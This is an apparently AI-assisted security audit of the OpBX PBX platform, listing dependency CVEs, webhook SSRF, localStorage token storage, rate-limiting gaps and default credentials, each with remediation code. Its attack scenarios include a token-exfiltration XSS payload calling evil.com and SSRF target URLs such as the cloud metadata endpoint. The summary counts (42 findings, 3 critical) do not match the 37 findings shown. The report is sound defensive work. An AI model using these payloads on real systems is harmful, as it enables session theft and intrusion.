# Security Review Results — 2026-04-11

**Reviewer:** Security Auditor Agent (AI-Assisted)
**Scope:** Full Security Review — All 11 Areas
**Branch/Commit:** develop (latest)
**Duration:** Comprehensive analysis across all security domains
**Workplan Reference:** `/docs/review-workplan/SECURITY-REVIEW-WORKPLAN.md` v1.0

---

## Executive Summary

This comprehensive security audit of the OpBX PBX platform examined all 11 review areas defined in the security workplan. The codebase demonstrates **strong security foundations** with proper multi-tenant isolation via OrganizationScope, comprehensive webhook signature verification with timing-safe comparison, structured audit logging with PII sanitization covering 32 sensitive key patterns, and defense-in-depth with circuit breakers and rate limiting.

The audit identified **42 findings** requiring attention. The most critical issues are dependency vulnerabilities (axios SSRF with CVSS 10.0, React Router XSS, AWS SDK injection), SSRF risk in user-configured webhook URLs without validation, and missing rate limiting on voice routing endpoints. These should be addressed before the next production deployment.

**Overall Security Rating: B**

**Key Strengths:**
- Multi-tenancy isolation with OrganizationScope and security failsafe (`WHERE 1 = 0` when unauthenticated)
- Role-based access control with 17 policy classes enforcing proper hierarchy
- Webhook signature verification with `hash_equals()` timing-safe comparison
- Comprehensive log sanitization (32 sensitive key patterns)
- Security headers (CSP, HSTS, X-Frame-Options, Permissions-Policy)
- Encrypted API keys at rest using Laravel's `encrypted` cast
- CXML builder uses DOMDocument for automatic XML encoding (prevents injection)
- Recording upload security pipeline with MIME, extension, and binary signature validation

**Key Risks:**
- 12 dependency vulnerabilities across PHP (6) and NPM (6+) packages
- SSRF via user-controlled webhook URLs (no validation)
- Token storage in localStorage vulnerable to XSS extraction
- Missing rate limiting on voice routing endpoints
- Default credentials in Docker configuration

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 10 |
| Medium | 15 |
| Low | 10 |
| Informational | 4 |
| **Total** | **42** |

---

## Critical & High Priority Findings

### [SR-2026-04-11-001] Axios Critical SSRF Vulnerability (NO_PROXY Bypass)
- **Severity:** Critical
- **CVSS Score:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-918 — Server-Side Request Forgery (SSRF)
- **Affected Component(s):** `frontend/package.json` (axios <=1.14.0)
- **Description:** Axios has multiple critical vulnerabilities including NO_PROXY hostname normalization bypass leading to SSRF (GHSA-3p68-rc4w-qgx5) and unrestricted cloud metadata exfiltration via header injection chain (GHSA-fvcv-3m26-pcqx).
- **Attack Scenario:** An attacker can bypass proxy restrictions to access internal services or cloud metadata endpoints, potentially exposing credentials or sensitive configuration data.
- **Evidence:**
  ```json
  // npm audit output
  "axios": {
    "severity": "critical",
    "via": [
      {
        "title": "Axios has a NO_PROXY Hostname Normalization Bypass Leads to SSRF",
        "severity": "critical",
        "cwe": ["CWE-441", "CWE-918"]
      },
      {
        "title": "Axios has Unrestricted Cloud Metadata Exfiltration via Header Injection Chain",
        "severity": "critical",
        "cvss": { "score": 10 }
      }
    ]
  }
  ```
- **Recommendation:** Update axios to latest version (>=1.15.0):
  ```bash
  cd frontend && npm update axios@latest
  ```
- **Verification:** Run `npm audit` and confirm zero critical vulnerabilities for axios.
- **Effort:** S
- **Status:** Open (from previous review SR-25)

---

### [SR-2026-04-11-002] React Router XSS via Open Redirects
- **Severity:** Critical
- **CVSS Score:** 8.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components, A03:2021 – Injection
- **CWE:** CWE-79 — Cross-site Scripting
- **Affected Component(s):** `frontend/package.json` (@remix-run/router <=1.23.1)
- **Description:** React Router 6.4.0-6.30.2 vulnerable to XSS via open redirects (GHSA-2w69-qvjg-hvjx). Combined with localStorage token storage, this could enable token theft.
- **Attack Scenario:** Attacker crafts malicious URL that exploits open redirect, injects XSS payload, steals token from localStorage via `localStorage.getItem('opbx_token')`.
- **Evidence:**
  ```json
  // npm audit output
  "@remix-run/router": {
    "severity": "high",
    "via": [{
      "title": "React Router vulnerable to XSS via Open Redirects",
      "severity": "high",
      "cwe": ["CWE-79"]
    }]
  }
  ```
- **Recommendation:** Update react-router-dom to latest version:
  ```bash
  cd frontend && npm update react-router-dom@latest
  ```
- **Verification:** Run `npm audit` and confirm zero high vulnerabilities for react-router.
- **Effort:** S
- **Status:** Open (from previous review SR-26)

---

### [SR-2026-04-11-003] SSRF Risk in Call Notification Webhook URLs
- **Severity:** High
- **CVSS Score:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N)
- **Category:** Area 3 — Input Validation & Injection
- **OWASP:** A10:2021 – Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918 — Server-Side Request Forgery (SSRF)
- **Affected Component(s):** 
  - `app/Http/Controllers/Api/CallNotificationsSettingsController.php`
  - `app/Services/CallNotifications/WebhookDispatcher.php`
  - `app/Http/Requests/CallNotifications/StoreSettingsRequest.php`
- **Description:** Users can configure webhook URLs for call notifications without server-side validation to prevent access to internal network resources. The WebhookDispatcher makes HTTP POST requests to user-configured URLs without validating against internal IP ranges or restricted protocols.
- **Attack Scenario:** A PBX Admin configures webhook URL as `http://redis:6379/`, `http://mysql:3306/`, or `http://169.254.169.254/latest/meta-data/` (cloud metadata). The dispatcher sends HTTP requests to internal services, potentially exposing configuration data, credentials, or enabling further exploitation.
- **Evidence:**
  ```php
  // WebhookDispatcher.php - line 121-123
  $response = Http::timeout($timeout)
      ->withHeaders($headers)
      ->post($settings->webhook_url, $payload);  // No URL validation!
  ```
- **Recommendation:** Add URL validation in StoreSettingsRequest:
  ```php
  private function isInternalUrl(string $url): bool
  {
      $host = parse_url($url, PHP_URL_HOST);
      $ip = gethostbyname($host);
      
      $blockedHosts = ['localhost', 'mysql', 'redis', 'minio', 'app', 'soketi'];
      if (in_array($host, $blockedHosts)) return true;
      
      // Check private IP ranges
      if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
          return true;
      }
      
      // Validate scheme
      $scheme = parse_url($url, PHP_URL_SCHEME);
      if (!in_array($scheme, ['http', 'https'])) return true;
      
      return false;
  }
  ```
- **Verification:** Attempt to save internal URLs as webhook targets — all should be rejected with 422.
- **Effort:** M
- **Status:** Open (from previous review SR-6)

---

### [SR-2026-04-11-004] Token Stored in localStorage — XSS Vulnerability
- **Severity:** High
- **CVSS Score:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
- **Category:** Area 1 — Authentication & Session Security
- **OWASP:** A07:2021 – Identification and Authentication Failures
- **CWE:** CWE-522 — Insufficiently Protected Credentials
- **Affected Component(s):** 
  - `frontend/src/utils/storage.ts`
  - `frontend/src/context/AuthContext.tsx`
- **Description:** Authentication tokens are stored in browser localStorage using `opbx_token` key. Any XSS vulnerability in the application allows attackers to steal tokens via `localStorage.getItem('opbx_token')`.
- **Attack Scenario:** An attacker finds an XSS vector (e.g., unsanitized conference room name rendered in UI, or third-party dependency with XSS) and injects `fetch('https://evil.com?t='+localStorage.getItem('opbx_token'))` to steal all active sessions.
- **Evidence:**
  ```typescript
  // frontend/src/utils/storage.ts
  const TOKEN_KEY = 'opbx_token';
  export const storage = {
    getToken(): string | null {
      return localStorage.getItem(TOKEN_KEY);  // Vulnerable to XSS extraction
    },
    setToken(token: string): void {
      localStorage.setItem(TOKEN_KEY, token);
    },
  };
  ```
- **Recommendation:** 
  - **Short-term:** Ensure strict CSP headers prevent inline script execution (already implemented)
  - **Long-term:** Migrate to httpOnly cookie-based authentication for the SPA, using Laravel Sanctum's cookie guard with CSRF protection
- **Verification:** After migration, confirm `document.cookie` and `localStorage` do not contain tokens accessible to JavaScript.
- **Effort:** L
- **Status:** Open (from previous review SR-1)

---

### [SR-2026-04-11-005] AWS SDK CloudFront Policy Document Injection
- **Severity:** High
- **CVSS Score:** 8.2
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-74 — Injection
- **Affected Component(s):** `composer.lock` (aws/aws-sdk-php 3.11.7-3.371.3)
- **Description:** AWS SDK vulnerable to CloudFront policy document injection via special characters (GHSA-27qh-8cxx-2cr5).
- **Recommendation:** Update AWS SDK:
  ```bash
  composer update aws/aws-sdk-php
  ```
- **Verification:** Run `composer audit` and confirm AWS SDK vulnerability resolved.
- **Effort:** S
- **Status:** Open (from previous review SR-28)

---

### [SR-2026-04-11-006] PHPUnit Unsafe Deserialization Vulnerability
- **Severity:** High
- **CVSS Score:** 8.1
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-502 — Deserialization of Untrusted Data
- **Affected Component(s):** `composer.lock` (phpunit/phpunit — dev dependency)
- **Description:** PHPUnit 9.0.0-12.5.7 vulnerable to unsafe deserialization in PHPT code coverage handling (CVE-2026-24765). Affects CI/CD pipelines.
- **Recommendation:** Update PHPUnit:
  ```bash
  composer update phpunit/phpunit --dev
  ```
- **Verification:** Run `composer audit` and confirm PHPUnit vulnerability resolved.
- **Effort:** S
- **Status:** Open (from previous review SR-29)

---

### [SR-2026-04-11-007] Missing Rate Limiting on Voice Webhook Endpoints
- **Severity:** High
- **CVSS Score:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
- **Category:** Area 4 — Webhook & API Security
- **OWASP:** A04:2021 – Insecure Design
- **CWE:** CWE-770 — Allocation of Resources Without Limits or Throttling
- **Affected Component(s):** `routes/webhooks.php` (voice routes)
- **Description:** Voice routing endpoints (`/voice/route`, `/voice/ivr-input`, `/callbacks/voice/ring-group-callback`, `/callbacks/voice/albs-follow-through`) have `voice.webhook.auth` middleware but no rate limiting. An attacker can flood these endpoints.
- **Attack Scenario:** Attacker sends thousands of requests to `/voice/route` with valid-format but incorrect Bearer tokens. Each request triggers database lookups for organization identification, exhausting connection pool and CPU.
- **Evidence:**
  ```php
  // routes/webhooks.php
  Route::post('/route', [VoiceRoutingController::class, 'handleInbound'])
      ->middleware(['voice.webhook.auth'])  // No rate_limit_org middleware
  ```
- **Recommendation:** Add rate limiting:
  ```php
  ->middleware(['voice.webhook.auth', 'rate_limit_org:voice_routing'])
  ```
  The `rate_limit_org:voice_routing` middleware already exists with 100/min default.
- **Verification:** Send >100 requests/min and verify 429 response.
- **Effort:** S
- **Status:** Open (from previous review SR-9)

---

### [SR-2026-04-11-008] OrganizationScope Bypass Without Explicit org_id Verification
- **Severity:** High
- **CVSS Score:** 8.1
- **Category:** Area 2 — Authorization & Access Control
- **OWASP:** A01:2021 – Broken Access Control
- **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
- **Affected Component(s):** Multiple files using `withoutGlobalScope(OrganizationScope::class)`
- **Description:** 45+ locations use `withoutGlobalScope()` to bypass tenant isolation for lookups. While most include subsequent org_id checks, the pattern of "fetch first, check later" means the full record is loaded into memory before verification. Some locations may have incomplete checks.
- **Attack Scenario:** If any `withoutGlobalScope` usage lacks proper org_id verification, an attacker could access resources from other organizations by guessing or enumerating IDs.
- **Evidence:**
  ```php
  // Pattern found in multiple files:
  $recording = Recording::withoutGlobalScope(OrganizationScope::class)
      ->find($payload['recording_id']);
  // org_id check happens AFTER query
  if ($recording->organization_id !== $expectedOrgId) { ... }
  ```
- **Recommendation:** Audit all `withoutGlobalScope` usages. Prefer inline org_id filtering:
  ```php
  $recording = Recording::withoutGlobalScope(OrganizationScope::class)
      ->where('organization_id', $expectedOrgId)  // Filter BEFORE loading
      ->find($payload['recording_id']);
  ```
- **Verification:** Search codebase for all 45 `withoutGlobalScope` usages and verify each has org_id filtering.
- **Effort:** M
- **Status:** Open (from previous review SR-4)

---

### [SR-2026-04-11-009] Flatted Library Unbounded Recursion DoS
- **Severity:** High
- **CVSS Score:** 7.5
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-674 — Uncontrolled Recursion
- **Affected Component(s):** `frontend/package-lock.json` (flatted <3.4.0)
- **Description:** Flatted library vulnerable to unbounded recursion DoS in parse() revive phase (GHSA-25h7-pfq9-p65f).
- **Recommendation:** Update flatted dependency:
  ```bash
  cd frontend && npm update flatted
  ```
- **Verification:** Run `npm audit` and confirm flatted vulnerability resolved.
- **Effort:** S
- **Status:** Open (new finding)

---

### [SR-2026-04-11-010] CAC Counter Race Condition in Go Worker
- **Severity:** High
- **CVSS Score:** 6.5
- **Category:** Area 9 — Business Logic Security
- **OWASP:** A04:2021 – Insecure Design
- **CWE:** CWE-362 — Concurrent Execution Using Shared Resource with Improper Synchronization ('Race Condition')
- **Affected Component(s):** `dialer-worker/internal/limiter/cac.go`
- **Description:** The CAC (Concurrent Active Calls) limiter checks `active < max` then separately increments, creating a TOCTOU race window where multiple goroutines could exceed the CAC limit.
- **Attack Scenario:** During high-volume campaign execution, the race window allows 2-3 extra concurrent calls beyond the configured limit, potentially violating telephony regulations or SLA agreements.
- **Evidence:**
  ```go
  // cac.go lines 81-89
  activeCalls, err := rl.redis.GetActiveCalls(ctx, campaignID)
  if err != nil {
      return false, err
  }
  if int(activeCalls) >= limiter.CAC {
      return false, nil // CAC limit reached
  }
  // Race window: another goroutine can increment between check and increment
  ```
- **Recommendation:** Use Redis Lua script for atomic check-and-increment:
  ```go
  const checkAndIncrementScript = `
      local current = redis.call('GET', KEYS[1]) or 0
      if tonumber(current) >= tonumber(ARGV[1]) then
          return -1
      end
      return redis.call('INCR', KEYS[1])
  `
  ```
- **Verification:** Concurrent load testing should not exceed CAC limit.
- **Effort:** M
- **Status:** Open (from previous review SR-35)

---

## Medium Priority Findings

### [SR-2026-04-11-011] No Account Lockout After Failed Login Attempts
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** Area 1 — Authentication & Session Security
- **OWASP:** A07:2021 – Identification and Authentication Failures
- **CWE:** CWE-307 — Improper Restriction of Excessive Authentication Attempts
- **Affected Component(s):** `app/Http/Controllers/Api/AuthController.php`
- **Description:** Login is rate-limited to 5 attempts/min per IP via `throttle:auth`, but there is no account-level lockout. An attacker can distribute brute-force attempts across IPs (botnet, proxy rotation) to bypass IP-based rate limiting.
- **Recommendation:** Implement progressive account lockout:
  ```php
  $key = "login_attempts:" . hash('sha256', $email);
  $attempts = Cache::get($key, 0);
  if ($attempts >= 10) {
      return response()->json(['message' => 'Account temporarily locked'], 429);
  }
  Cache::put($key, $attempts + 1, now()->addMinutes(30));
  ```
- **Effort:** M
- **Status:** Open (from previous review SR-2)

---

### [SR-2026-04-11-012] User Enumeration via Registration Validation
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** Area 1 — Authentication & Session Security
- **OWASP:** A01:2021 – Broken Access Control
- **CWE:** CWE-204 — Observable Response Discrepancy
- **Affected Component(s):** `app/Http/Controllers/Api/RegisterController.php` (line 120-143)
- **Description:** The `/v1/auth/register/validate` endpoint returns `admin_email_available: true/false`, allowing attackers to enumerate registered email addresses.
- **Recommendation:** Return generic responses or add aggressive rate limiting (1 request/10 seconds).
- **Effort:** S
- **Status:** Open (from previous review SR-3)

---

### [SR-2026-04-11-013] Platform Manager Token Revocation Incomplete
- **Severity:** Medium
- **CVSS Score:** 6.5
- **Category:** Area 2 — Authorization & Access Control
- **OWASP:** A07:2021 – Identification and Authentication Failures
- **CWE:** CWE-613 — Insufficient Session Expiration
- **Affected Component(s):** `app/Http/Controllers/Platform/PlatformUserController.php`
- **Description:** When platform manager status is revoked, existing tokens may not be immediately invalidated, allowing continued access until 24-hour expiry.
- **Recommendation:** Revoke all tokens when `is_platform_manager` changes: `$user->tokens()->delete();`
- **Effort:** S
- **Status:** Open (from previous review SR-5)

---

### [SR-2026-04-11-014] CXML Builder Conference Identifier Not Validated
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** Area 3 — Input Validation & Injection
- **OWASP:** A03:2021 – Injection
- **CWE:** CWE-20 — Improper Input Validation
- **Affected Component(s):** `app/Services/CxmlBuilder/CxmlBuilder.php` (line 202-241)
- **Description:** Conference identifiers are inserted into CXML via `DOMDocument::textContent` (which provides XML encoding), but the identifiers aren't validated for expected format. While DOMDocument prevents XML injection, unexpected characters could cause Cloudonix platform issues.
- **Recommendation:** Add alphanumeric validation: `preg_match('/^[a-zA-Z0-9_-]+$/', $identifier)`.
- **Effort:** S
- **Status:** Open (from previous review SR-7)

---

### [SR-2026-04-11-015] Session-Update Webhook Skips Idempotency
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** Area 4 — Webhook & API Security
- **OWASP:** A08:2021 – Software and Data Integrity Failures
- **CWE:** CWE-837 — Improper Enforcement of a Single, Unique Action
- **Affected Component(s):** `routes/webhooks.php` (line 32-34)
- **Description:** The session-update endpoint intentionally skips `webhook.idempotency` middleware for performance (high-velocity endpoint). While documented in comments, this means duplicate session updates can be processed, potentially causing incorrect call state.
- **Recommendation:** Implement lightweight deduplication using `event_id` with short Redis TTL (60s) rather than full idempotency middleware.
- **Effort:** M
- **Status:** Open (from previous review SR-10)

---

### [SR-2026-04-11-016] Health Endpoint Exposes Service Details
- **Severity:** Medium
- **CVSS Score:** 4.3
- **Category:** Area 4 — Webhook & API Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-200 — Exposure of Sensitive Information
- **Affected Component(s):** `routes/webhooks.php` (line 107-116)
- **Description:** The health endpoint returns database name and Redis store type to unauthenticated users, leaking infrastructure details.
- **Evidence:**
  ```php
  'services' => [
      'database' => DB::connection()->getDatabaseName() ? 'connected' : 'disconnected',
      'redis' => Cache::getStore() instanceof \Illuminate\Cache\RedisStore ? 'connected' : 'disconnected',
  ]
  ```
- **Recommendation:** Return only `{status: "ok"}` for public health checks. Move detailed checks behind authentication.
- **Effort:** S
- **Status:** Open (from previous review SR-11)

---

### [SR-2026-04-11-017] Default MinIO Credentials in docker-compose.yml
- **Severity:** Medium
- **CVSS Score:** 6.5
- **Category:** Area 7 — Infrastructure Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-798 — Use of Hard-coded Credentials
- **Affected Component(s):** `docker-compose.yml` (line 201-202)
- **Description:** MinIO uses `minioadmin/minioadmin` as default credentials. If not changed in production, all stored recordings are accessible.
- **Evidence:**
  ```yaml
  MINIO_ROOT_USER: ${MINIO_ACCESS_KEY:-minioadmin}
  MINIO_ROOT_PASSWORD: ${MINIO_SECRET_KEY:-minioadmin}
  ```
- **Recommendation:** Remove defaults, add validation in entrypoint.
- **Effort:** S
- **Status:** Open (from previous review SR-18)

---

### [SR-2026-04-11-018] Dialer Worker API Token Uses Weak Default
- **Severity:** Medium
- **CVSS Score:** 6.5
- **Category:** Area 7 — Infrastructure Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-798 — Use of Hard-coded Credentials
- **Affected Component(s):** `docker-compose.yml`, `.env.example`
- **Description:** Default token `dev-token-change-in-production` could be used in production if not changed.
- **Recommendation:** Remove default, add startup validation, generate with `openssl rand -hex 32`.
- **Effort:** S
- **Status:** Open (from previous review SR-19)

---

### [SR-2026-04-11-019] Redis Password May Be Empty in Development
- **Severity:** Medium
- **CVSS Score:** 5.9
- **Category:** Area 7 — Infrastructure Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-306 — Missing Authentication for Critical Function
- **Affected Component(s):** `docker-compose.yml` (line 66, 106, 134)
- **Description:** `REDIS_PASSWORD` may default to empty. If accidentally deployed to production, Redis is unauthenticated.
- **Recommendation:** Enforce Redis password in all environments.
- **Effort:** S
- **Status:** Open (from previous review SR-20)

---

### [SR-2026-04-11-020] HSTS Header Missing from Nginx Configuration
- **Severity:** Medium
- **CVSS Score:** 5.3
- **Category:** Area 7 — Infrastructure Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-319 — Cleartext Transmission of Sensitive Information
- **Affected Component(s):** `docker/nginx/conf.d/default.conf`
- **Description:** No HSTS header in Nginx config. While the Laravel SecurityHeaders middleware adds HSTS, Nginx should also set it for static assets and error pages.
- **Recommendation:** Add `add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;` to Nginx config.
- **Effort:** S
- **Status:** Open (from previous review SR-22)

---

### [SR-2026-04-11-021] Paragonie Sodium Compat Cryptographic Vulnerabilities
- **Severity:** Medium
- **CVSS Score:** 7.5
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-327 — Broken/Risky Cryptographic Algorithm
- **Affected Component(s):** `composer.lock` (paragonie/sodium_compat)
- **Description:** paragonie/sodium_compat <1.24.0 has incomplete input validation (CVE-2025-69277) and missing subgroup check for Edwards25519.
- **Recommendation:** Update sodium_compat:
  ```bash
  composer update paragonie/sodium_compat
  ```
- **Effort:** S
- **Status:** Open (from previous review SR-30)

---

### [SR-2026-04-11-022] Campaign Lifecycle Transitions Not Locked
- **Severity:** Medium
- **CVSS Score:** 4.3
- **Category:** Area 9 — Business Logic Security
- **OWASP:** A04:2021 – Insecure Design
- **CWE:** CWE-362 — Race Condition
- **Affected Component(s):** `app/Services/AutoDialer/CampaignLifecycleManager.php`
- **Description:** Campaign state transitions (start, pause, resume, archive) may not use distributed locks, allowing concurrent requests to create inconsistent state.
- **Recommendation:** Add Redis lock for campaign lifecycle transitions.
- **Effort:** S
- **Status:** Open (from previous review SR-36)

---

### [SR-2026-04-11-023] League CommonMark HTML Bypass Vulnerabilities
- **Severity:** Medium
- **CVSS Score:** 3.1
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-80 — Improper Neutralization of Script-Related HTML Tags in a Web Page
- **Affected Component(s):** `composer.lock` (league/commonmark)
- **Description:** Two vulnerabilities: DisallowedRawHtml bypass via whitespace (CVE-2026-30838) and embed extension allowed_domains bypass (CVE-2026-33347).
- **Recommendation:** Update commonmark:
  ```bash
  composer update league/commonmark
  ```
- **Effort:** S
- **Status:** Open (from previous review SR-31)

---

### [SR-2026-04-11-024] CDR Webhooks Accept Arbitrarily Old Timestamps
- **Severity:** Medium
- **CVSS Score:** 3.1
- **Category:** Area 4 — Webhook & API Security
- **OWASP:** A08:2021 – Software and Data Integrity Failures
- **CWE:** CWE-345 — Insufficient Verification of Data Authenticity
- **Affected Component(s):** `app/Http/Middleware/EnsureWebhookIdempotency.php` (line 44-58)
- **Description:** CDR webhooks are exempted from the 5-minute timestamp freshness check, with no upper age limit. An attacker with a captured CDR webhook could replay it years later.
- **Recommendation:** Add maximum age for CDRs (e.g., 24 hours or 7 days).
- **Effort:** S
- **Status:** Open (from previous review SR-17)

---

## Low Priority Findings

### [SR-2026-04-11-025] SIP Passwords Stored in Plaintext
- **Severity:** Low (Accepted Risk)
- **CVSS Score:** 5.3
- **Category:** Area 5 — Data Protection & Privacy
- **OWASP:** A02:2021 – Cryptographic Failures
- **CWE:** CWE-256 — Unprotected Storage of Credentials
- **Affected Component(s):** `app/Models/Extension.php`
- **Description:** SIP extension passwords are stored in plaintext in the `extensions.password` column. This is a protocol requirement for SIP authentication (SIP digest auth requires the plain password to compute the response), but creates risk if the database is compromised.
- **Recommendation:** **Accepted risk** with compensating controls:
  1. Document as accepted risk in security documentation
  2. Ensure passwords are hidden from serialization (`$hidden` array) — ✅ already done
  3. Add `sensitive-operations` middleware to password retrieval endpoint
  4. Consider database-level encryption (MySQL TDE) for at-rest protection
  5. Generate strong random passwords (32 hex chars) — ✅ already done
- **Effort:** S (documentation)
- **Status:** Open (from previous review SR-13)

---

### [SR-2026-04-11-026] Webhook Payload Phone Numbers (PII) in Logs
- **Severity:** Low
- **CVSS Score:** 4.3
- **Category:** Area 5 — Data Protection & Privacy
- **OWASP:** A09:2021 – Security Logging and Monitoring Failures
- **CWE:** CWE-532 — Insertion of Sensitive Information into Log File
- **Affected Component(s):** `app/Http/Controllers/Webhooks/CloudonixWebhookController.php`
- **Description:** Some webhook log statements include raw phone numbers (caller_id, destination) which constitute PII. LogSanitizer focuses on secrets/credentials but doesn't mask phone numbers.
- **Recommendation:** Add phone number masking to LogSanitizer: `+1234****789` pattern for E.164 numbers.
- **Effort:** S
- **Status:** Open (from previous review SR-14)

---

### [SR-2026-04-11-027] CDR raw_cdr JSON Stores Full Cloudonix Payload
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** Area 5 — Data Protection & Privacy
- **OWASP:** A02:2021 – Cryptographic Failures
- **CWE:** CWE-312 — Cleartext Storage of Sensitive Information
- **Affected Component(s):** `app/Models/CallDetailRecord.php`
- **Description:** The `raw_cdr` column stores the complete Cloudonix CDR webhook payload as JSON, which may include sensitive metadata. No sanitization is applied before storage.
- **Recommendation:** Review Cloudonix CDR payload for sensitive fields and redact before storage, or document what data is stored.
- **Effort:** S
- **Status:** Open (from previous review SR-15)

---

### [SR-2026-04-11-028] HMAC Signature Separator Could Allow Ambiguity
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** Area 6 — Cryptography
- **OWASP:** A02:2021 – Cryptographic Failures
- **CWE:** CWE-345 — Insufficient Verification of Data Authenticity
- **Affected Component(s):** `app/Http/Controllers/Api/RecordingsController.php`
- **Description:** Recording HMAC uses `HMAC-SHA256("{path}|{expires}", APP_KEY)`. If `{path}` contains the `|` character, the signature could be forged for different path/expires combinations.
- **Recommendation:** Use a separator that cannot appear in the path (e.g., null byte `\0`) or hash path separately: `HMAC(path) || HMAC(expires)`.
- **Effort:** S
- **Status:** Open (from previous review SR-16)

---

### [SR-2026-04-11-029] ngrok Service in Main docker-compose.yml
- **Severity:** Low
- **CVSS Score:** 3.7
- **Category:** Area 7 — Infrastructure Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-200 — Exposure of Sensitive Information
- **Affected Component(s):** `docker-compose.yml` (line 285-299)
- **Description:** ngrok tunnel service is in the main compose file, risking accidental production exposure.
- **Recommendation:** Move to `docker-compose.override.yml` or `docker-compose.dev.yml`.
- **Effort:** S
- **Status:** Open (from previous review SR-21)

---

### [SR-2026-04-11-030] Nginx Does Not Set server_tokens off
- **Severity:** Low
- **CVSS Score:** 2.0
- **Category:** Area 7 — Infrastructure Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-200 — Information Disclosure
- **Affected Component(s):** `docker/nginx/nginx.conf`
- **Description:** Nginx may expose its version number in response headers and error pages.
- **Recommendation:** Add `server_tokens off;` to nginx.conf.
- **Effort:** S
- **Status:** Open (from previous review SR-23)

---

### [SR-2026-04-11-031] Nginx Missing client_max_body_size
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** Area 7 — Infrastructure Security
- **OWASP:** A05:2021 – Security Misconfiguration
- **CWE:** CWE-770 — Allocation of Resources Without Limits
- **Affected Component(s):** `docker/nginx/conf.d/default.conf`
- **Description:** No `client_max_body_size` directive. Relies solely on PHP upload limits. Large payloads could exhaust Nginx buffers.
- **Recommendation:** Add `client_max_body_size 10M;`.
- **Effort:** S
- **Status:** Open (from previous review SR-24)

---

### [SR-2026-04-11-032] WebSocket Channel Data Includes Phone Numbers
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** Area 10 — Real-Time & WebSocket Security
- **OWASP:** N/A
- **CWE:** CWE-200 — Information Disclosure
- **Affected Component(s):** `app/Events/CallInitiated.php`
- **Description:** The `CallInitiated` broadcast event includes `from` and `to` phone numbers. Any user subscribed to the organization channel sees all caller IDs.
- **Recommendation:** Consider role-based filtering of broadcast data (Reporter role shouldn't see caller IDs).
- **Effort:** M
- **Status:** Open (from previous review SR-37)

---

### [SR-2026-04-11-033] Symfony Process Argument Escaping on Windows
- **Severity:** Low
- **CVSS Score:** 3.1
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-78 — OS Command Injection
- **Affected Component(s):** `composer.lock` (symfony/process)
- **Description:** Incorrect argument escaping under MSYS2/Git Bash on Windows (CVE-2026-24739). Low impact — OpBX runs on Linux/Docker.
- **Recommendation:** Update symfony/process:
  ```bash
  composer update symfony/process
  ```
- **Effort:** S
- **Status:** Open (from previous review SR-32)

---

### [SR-2026-04-11-034] PsySH Local Privilege Escalation
- **Severity:** Low
- **CVSS Score:** 3.3
- **Category:** Area 8 — Dependency Security
- **OWASP:** A06:2021 – Vulnerable and Outdated Components
- **CWE:** CWE-426 — Untrusted Search Path
- **Affected Component(s):** `composer.lock` (psy/psysh — dev dependency)
- **Description:** Local privilege escalation via CWD .psysh.php auto-load (CVE-2026-25129). Dev-only.
- **Recommendation:** Update psysh:
  ```bash
  composer update psy/psysh --dev
  ```
- **Effort:** S
- **Status:** Open (from previous review SR-33)

---

## Informational Notes

### [SR-2026-04-11-035] OrganizationScope::bypass() Usage Count: 45+
- **Category:** Architecture
- **Description:** Extensive use of bypass pattern throughout codebase (45+ occurrences). While implementation is secure (counter-based, closure-scoped), the volume increases attack surface. Consider architectural changes to reduce bypass needs.
- **Status:** Informational (from previous review SR-41)

---

### [SR-2026-04-11-036] Token Abilities Use Scoped Patterns (Not Wildcard)
- **Category:** Authentication
- **Description:** AuthController creates tokens with role-scoped abilities (e.g., `extension:*`, `user:read`). This is a positive finding — the prior wildcard concern has been addressed.
- **Status:** Positive Finding (from previous review SR-42)

---

### [SR-2026-04-11-037] CXML Generation Uses DOMDocument (Secure)
- **Category:** Injection Prevention
- **Description:** CxmlBuilder uses PHP DOMDocument which automatically XML-encodes text content. This effectively prevents CXML injection. Positive finding.
- **Status:** Positive Finding (from previous review SR-43)

---

